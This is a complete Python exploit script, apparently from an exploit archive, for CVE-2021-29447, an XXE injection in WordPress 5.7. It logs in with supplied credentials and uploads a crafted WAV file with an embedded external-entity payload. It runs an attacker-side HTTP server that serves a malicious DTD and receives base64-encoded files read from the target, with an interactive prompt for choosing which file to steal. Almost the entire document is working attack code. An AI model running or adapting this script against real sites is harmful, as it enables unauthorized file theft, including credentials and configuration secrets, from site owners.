# Exploit Title: WordPress 5.7 - XXE injection
# Google Dork: N/A
# Date: 2022-11-18
# Exploit Author: Musyoka Ian
# Vendor Homepage: https://wordpress.com/
# Software Link: https://wordpress.org/download/
# Version: WordPress 5.7
# Tested on: Ubuntu 20.04, WordPress 5.7
# CVE : CVE-2021-29447


#!/usr/bin/env python3

import requests
import re
from http.server import HTTPServer, BaseHTTPRequestHandler
from socketserver import ThreadingMixIn
from termcolor import colored
import threading
from base64 import b64decode
import sys
from cmd import Cmd
import argparse


class Terminal(Cmd):
    prompt = "filename => "
    def default(self, args):
        extract_file(args)


class handler(BaseHTTPRequestHandler):
    def do_GET(self):
        self.send_response(200)
        self.end_headers()
        with open("payload.txt", "r") as file:
            out = file.read()

        if self.path == "/evil.dtd":
            serve = colored("[+] Serving payload", "red")
            print(serve)
            self.wfile.write(out.encode())
        elif "leaked" in self.path:
            raw_file = (self.path).split("?p=")
            success_exfil = colored("[+] File exfil successful", "green")
            print(success_exfil)
            file_extracted = (b64decode(raw_file[1])).decode()
            if file_extracted == "":
                fail = colored("[+] File retrieval unsuccessful", "red")
                print(fail)
            else:
                print(file_extracted)
        else:
            message = "Wordpress 5.7 exploitaition server"
            self.wfile.write(message.encode())
    def log_message(self, format: str, *args: None) -> None:
        return None

class server(HTTPServer, ThreadingMixIn):
    pass

def run_server():
    http = server(("0.0.0.0", int(arguments.port)), handler)
    http.serve_forever()


def wordpress_login():
    global cookie1
    login_message = colored("[+] Attempting to login in to wordpress", "blue")
    print(login_message)


    cookie = {
        "wordpress_test_cookie" : "WP Cookie check"
    }

    postdata = {
        "log": f"{arguments.username}",
        "pwd": f"{arguments.password}",
        "wp-submit" : "Log In",
        "redirect_to" : f"{arguments.url}/wp-admin/",
        "testcookie": 1
    }
    output = requests.post(f"{arguments.url}/wp-login.php", cookies= cookie ,data = postdata, allow_redirects=False)
    if output.status_code == 302:
        cookies = output.headers["Set-Cookie"]
        cookie1 = output.cookies.get_dict()
        success = colored(f"[+] Login success\n[+] Authenticated cookies extracted:\n\n {cookies}", "green")
        print(success)

    else:
        failure = colored("[-] Login Failure check your credentials and try again", "red")
        print(failure)
        sys.exit(0)


def payload_upload():
    global cookie1

    out = requests.get(f"{arguments.url}/wp-admin/upload.php", cookies = cookie1)
    nonce = re.search('upload-attachment","_wpnonce":"(.*?)"', out.text, re.DOTALL).group(1)
    nonce_success = colored(f"[+] Successfully extracted nonce: {nonce}", "blue")
    print(nonce_success)
    xxe_payload = b64decode("UklGRrIAAABXQVZFaVhNTHYAAAA8P3htbCB2ZXJzaW9uPSIxLjAiPz48IURPQ1RZUEUgQU5ZWzwhRU5USVRZICUgcmVtb3RlIFNZU1RFTSAnaHR0cDovLw==")
    xxe_payload += f"""{arguments.lhost}:{arguments.port}""".encode()
    xxe_payload += b64decode("L2V2aWwuZHRkJz4lcmVtb3RlOyVpbml0OyV0cmljaztdPmZtdCAQAAAAAQABAESsAAAQsQIABAAgAGRhdGEQAAAAAAAAAGU73/+bxA==")
    
    files = {
        "name" : (None, "exploit.wav"),
        "action" : (None, "upload-attachment"),
        "_wpnonce" : (None, f"{nonce}"),
        "async-upload" : ("exploit.wav", xxe_payload)

    }

    check_upload = requests.post(f"{arguments.url}/wp-admin/async-upload.php", files=files, cookies=cookie1)
    if check_upload.status_code == 502 or check_upload.text == "success":
        upload_success = colored("[+] Upload was successful", "green")
        print(upload_success)

    
def extract_file(filenm):
    payload = f"""<!ENTITY % file SYSTEM "php://filter/read=convert.base64-encode/resource={filenm}">\n\n<!ENTITY % init "<!ENTITY &#x25; trick SYSTEM 'http://{arguments.lhost}:{arguments.port}/leaked?p=%file;'>" >"""
    with open("payload.txt", "w") as file:
        file.write(payload)
        file.close()
    payload_upload()
        

if __name__ == "__main__":
    art = """                  _                 _    __               _                                
 \    / _  ._ _| |_) ._ _   _  _   |_     /   __   \/ \/ |_   o ._  o  _   _ _|_ o  _  ._  
  \/\/ (_) | (_| |   | (/_ _> _>    _) o /         /\ /\ |_   | | | | (/_ (_  |_ | (_) | | 
                                                                   _|                      """
    banner = colored(art, "cyan")
    print(banner)
    args = argparse.ArgumentParser(description="parse exploit arguments")
    args.add_argument("-U", "--url", metavar="", type=str, help="WordPress base url", required=True)
    args.add_argument("-u", "--username", metavar="", type=str, help="WordPress username", required=True)
    args.add_argument("-p", "--password", metavar="", type=str, help="WordPress password", required=True)
    args.add_argument("-P", "--port", metavar="", type=int, help="Python Server listening port", required=True)
    args.add_argument("-l", "--lhost", metavar="", type=str, help="Attacker IP Address", required=True)
    arguments = args.parse_args()
    status = colored(f"[*] Serving HTTP on 0.0.0.0 port {arguments.port} (http://0.0.0.0:{arguments.port}/)", "yellow")
    print(status)
    wordpress_login()
    thread = threading.Thread(target=run_server,)
    thread.start()
    terminal = Terminal()
    terminal.cmdloop()
